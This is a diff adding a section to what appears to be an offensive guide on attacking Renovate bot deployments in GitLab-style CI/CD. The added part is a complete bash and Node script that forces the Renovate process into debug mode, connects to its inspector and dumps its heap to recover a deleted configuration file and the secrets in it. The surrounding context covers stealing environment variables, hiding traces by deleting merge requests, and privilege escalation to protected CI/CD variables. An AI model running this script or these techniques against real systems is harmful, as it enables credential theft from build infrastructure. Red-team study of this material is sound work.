@@ -111,6 +111,58 @@ In that file, extract all sensitive environment variables and use them for later
 
 > After receiving a merge request from the Renovate bot, you must fully delete both the branch and the merge request. This ensures the bot will recreate them, allowing your script to run again. Otherwise, the script will not be executed a second time. Ensure to revert the commits as well if they were merged.
 
+### Dump Renovate Process Heap
+In some cases the Renovate bot configuration file might have been [deleted](https://docs.renovatebot.com/self-hosted-configuration/#deleteconfigfile) and you want to recover it. The following script can be used to dump the heap for further analysis.
+
+```bash
+#!/bin/bash
+
+PID=$(ps -eo pid,args | grep -E '/node\b.*renovate' | grep -v grep | awk '{print $1}' | head -1)
+echo "Renovate PID: $PID"
+
+kill -USR1 "$PID"
+sleep 2
+
+WS_URL=$(/usr/local/renovate/node -e "
+  const http = require('http');
+  http.get('http://127.0.0.1:9229/json', r => {
+    let d = '';
+    r.on('data', c => d += c);
+    r.on('end', () => console.log(JSON.parse(d)[0].webSocketDebuggerUrl));
+  });
+" 2>/dev/null)
+
+echo "WS: $WS_URL"
+
+/usr/local/renovate/node -e "
+  const ws = new WebSocket('$WS_URL');
+  const chunks = [];
+  const t = setTimeout(() => process.exit(1), 120000);
+
+  ws.addEventListener('open', () => {
+    ws.send(JSON.stringify({
+      id: 1,
+      method: 'HeapProfiler.takeHeapSnapshot',
+      params: { reportProgress: false }
+    }));
+  });
+
+  ws.addEventListener('message', e => {
+    const m = JSON.parse(e.data);
+    if (m.method === 'HeapProfiler.addHeapSnapshotChunk') {
+      chunks.push(m.params.chunk);
+    }
+    if (m.id === 1) {
+      clearTimeout(t);
+      require('fs').writeFileSync('/tmp/heap.json', chunks.join(''));
+      ws.close();
+    }
+  });
+" 2>/dev/null
+
+echo "Saved /tmp/heap.json ($(wc -c < /tmp/heap.json) bytes)"
+```
+
 ## 3. Privilege Escalation via Renovate Bot Branches
 
 In this scenario, assume you already have access to a repository, but only with developer permissions. You want to gain access to the CI/CD variables configured for deployments. However, you cannot directly access these, as they are only provided to pipeline runs on protected branches like the main branch.
